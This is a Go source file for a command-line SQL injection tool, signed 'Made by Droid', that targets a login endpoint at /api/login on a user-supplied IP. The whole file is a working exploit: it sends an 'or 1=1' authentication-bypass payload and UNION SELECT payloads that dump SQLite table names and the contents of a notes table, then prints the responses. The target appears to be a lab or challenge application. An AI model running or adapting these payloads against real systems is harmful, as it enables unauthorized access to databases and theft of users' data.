package main

import (
        "fmt"
        "io/ioutil"
        "log"
        "net/http"
        "net/url"
        "os"
)

type SQLi interface {
        exploit()
        commands()
}

type Req struct {
        ip      string
        command string
}

func (r *Req) commands() {
        fmt.Println(`
 _____     _    _____       _         _   _         
|   __|___| |  |     |___  |_|___ ___| |_|_|___ ___ 
|__   | . | |  |-   -|   | | | -_|  _|  _| | . |   |
|_____|_  |_|  |_____|_|_|_| |___|___|_| |_|___|_|_|
        |_|              |___|          

| Made by Droid |
`)
        fmt.Println(`Commands:
1. Dump Users
2. Dump Tables
3. Dump Notes
`)
}

func (r *Req) exploit() {
        if r.command == "1" {
                form := url.Values{
                        "username": {"admin' or 1=1 --"},
                        "password": {"test"},
                }

                resp, err := http.PostForm("http://"+r.ip+"/api/login", form)
                if err != nil {
                        log.Fatal(err)
                }
                defer resp.Body.Close()

                body, err := ioutil.ReadAll(resp.Body)
                if err != nil {
                        log.Fatal(err)
                }

                fmt.Println(string(body))
        } else if r.command == "2" {
                form := url.Values{
                        "username": {"admin'UNION SELECT null, tbl_name FROM sqlite_master-- "},
                        "password": {"test"},
                }

                resp, err := http.PostForm("http://"+r.ip+"/api/login", form)
                if err != nil {
                        log.Fatal(err)
                        log.Fatal(err)
                }
                defer resp.Body.Close()

                body, err := ioutil.ReadAll(resp.Body)
                if err != nil {
                        log.Fatal(err)
                }

                fmt.Println(string(body))

        } else if r.command == "3" {
                form := url.Values{
                        "username": {"admin'UNION SELECT null, notes FROM notes-- "},
                        "password": {"test"},
                }
                resp, err := http.PostForm("http://"+r.ip+"/api/login", form)
                if err != nil {
                        log.Fatal(err)
                }
                defer resp.Body.Close()
                body, err := ioutil.ReadAll(resp.Body)
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(body))
        } else {
                fmt.Println("Invalid Command")
        }
}

func callExploit(sqli SQLi) {
        sqli.exploit()
}

func main() {
        r := Req{}
        if len(os.Args) < 3 {
                r.commands()
                fmt.Println("Usage: ./sqli <ip> <command>")
                os.Exit(1)
        }
        r.ip = os.Args[1]
        r.command = os.Args[2]
        callExploit(&r)
}
